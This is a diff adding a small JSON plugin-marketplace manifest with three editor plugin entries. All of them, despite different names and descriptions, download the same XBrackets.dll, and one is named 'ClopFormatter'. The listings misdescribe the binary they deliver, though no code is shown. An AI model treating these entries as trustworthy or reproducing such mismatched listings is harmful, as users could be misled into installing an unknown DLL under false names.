@@ -1,0 +1,20 @@
+[
+  {
+    "name": "Notepad++ Plugin Windows",
+    "version": "1.0.0",
+    "description": "Adds Python syntax highlighting and indentation rules",
+    "download_url": "https://github.com/GGyartengApp/editor-plugin-marketplace/blob/main/plugins/XBrackets.dll"
+  },
+  {
+    "name": "CppFormatter",
+    "version": "1.0.1",
+    "description": "Automatically formats C++ code on save",
+    "download_url": "https://github.com/GGyartengApp/editor-plugin-marketplace/blob/main/plugins/XBrackets.dll"
+  },
+    {
+    "name": "ClopFormatter",
+    "version": "1.0.1",
+    "description": "Automatically formats C++ code on save",
+    "download_url": "https://github.com/GGyartengApp/editor-plugin-marketplace/blob/main/plugins/XBrackets.dll"
+  }
+]
